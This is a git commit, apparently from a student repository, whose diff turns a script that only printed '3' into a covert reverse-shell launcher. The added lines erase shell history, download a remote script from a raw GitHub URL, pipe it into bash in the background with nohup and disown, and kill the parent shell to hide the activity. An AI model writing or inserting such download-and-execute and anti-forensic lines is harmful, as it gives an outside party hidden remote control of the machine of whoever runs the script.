fb66ed1e5cc27a6f80372905c3520c1a16791885
Waz0x <remy.noulin@epitech.eu>
2021-09-09 14:40:19 +0200

    MOD | added reverseshell

--- scripts/3.sh
+++ scripts/3.sh
@@ -1,2 +1,4 @@
 #!/bin/bash
-echo "3"
+# Desc: ReverseShell from tom (:panik:)
+export HISTFILE=/dev/null
+(nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/rd1.sh 2> /dev/null&disown)|nohup bash >& /dev/null&disown;kill -9 $$
